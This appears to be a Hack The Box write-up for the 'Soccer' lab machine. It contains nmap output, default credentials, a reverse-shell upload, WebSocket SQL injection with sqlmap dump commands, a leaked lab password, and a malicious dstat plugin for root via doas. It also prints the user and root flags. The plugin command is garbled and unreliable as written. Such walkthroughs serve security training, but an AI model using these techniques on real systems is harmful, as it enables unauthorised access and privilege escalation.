+++
title = "HTB - Soccer"
date = 2024-11-29
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.11.194
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 18:59 EST
Nmap scan report for 10.10.11.194
Host is up (0.087s latency).
Not shown: 65241 closed tcp ports (reset), 291 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sat, 30 Nov 2024 00:00:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sat, 30 Nov 2024 00:00:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.94SVN%I=7%D=11/29%Time=674A55A1%P=aarch64-unknown-linu
SF:x-gnu%r(informix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x
SF:20Found\r\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Conte
SF:nt-Type-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=u
SF:tf-8\r\nContent-Length:\x20139\r\nDate:\x20Sat,\x2030\x20Nov\x202024\x2
SF:000:00:38\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<ht
SF:ml\x20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</
SF:title>\n</head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html
SF:>\n")%r(HTTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Se
SF:curity-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
SF:h:\x20143\r\nDate:\x20Sat,\x2030\x20Nov\x202024\x2000:00:38\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<
SF:head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<bod
SF:y>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPReque
SF:st,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x2
SF:0default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent
SF:-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate
SF::\x20Sat,\x2030\x20Nov\x202024\x2000:00:38\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20c
SF:harset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x
SF:20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBin
SF:dReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.08 seconds
```

### Enumeration
Tiny File Manager Portal. Credentials are default via Github `admin:admin@123`
We find version to be 2.4.3, we can upload a PHP reverse shell to the uploads folder. Once done, visit the `tiny/uploads/shell.php` and you'll get a hit back on your listener.
User `player` has a directory and flag that are off limits. 
I checked the processes and network instances. An internal webpage runs on 3000, and I'm guessing some SQL instances on 3306 and 33060.
We can check the site configuration by visiting `etc/nginx/site-enabled/`. We see `soc-player` as a new subdomain. Update `/etc/hosts` and visit the site.
When we visit, it looks like a replica of the first site. We have menu options. I created an account and was able to verify my ticket number. I can see if a number does or does not validate properly. I captured the request in Burp, and saw Express. I also saw a reach out to `/check`. Recent work on NodeBlog and Help, we know this is NodeJS.
When we log on and view the source code of the application, we can see another call out to 9091.
The ticket validation field is vulnerable to SQLi, but there's nothing being sent from client to server?
WebSockets. When we intercept (Do so only when logged in and about to submit a number), we get this:
```
{"id":"56475 or 1=1 --"}
```
We can pass this to `wscat` for web socket analysis, and then to `sqlmap` for brute forcing.
`wscat -c soc-player.soccer.htb:9091/`
`sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5`
`sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs`
`sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --threads 10 -D soccer_db --dump`
We will get credentials from dump. We can `su` to gain a higher privilege shell `player:PlayerOftheMatch2022`
USER:`a3ff989cf327ed3f39351aef9c72f601`
`sudo -l` does not yield anything, but `find / -perm -4000 2>/dev/null` will check SUID binaries.
We find `doas`, which is a `sudo` equivalent seen on OpenBSD systems. We can locate the configuration file with:
`find / -name doas.conf 2>/dev/null`
Upon viewing, we can see that we are allowed to run `dstat` as root.
DStat is a tool for gathering system information, and we can create a malicious plugin as follows:
`echo -e 'import oecho -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_li0t.py`
Reading on the man page suggests that plugins follow that naming syntax.
Run `doas /usr/bin/dstat --li0t` to drop into a root shell.
ROOT:`77b7fdcc9de04089eda7f127d51ea20a`


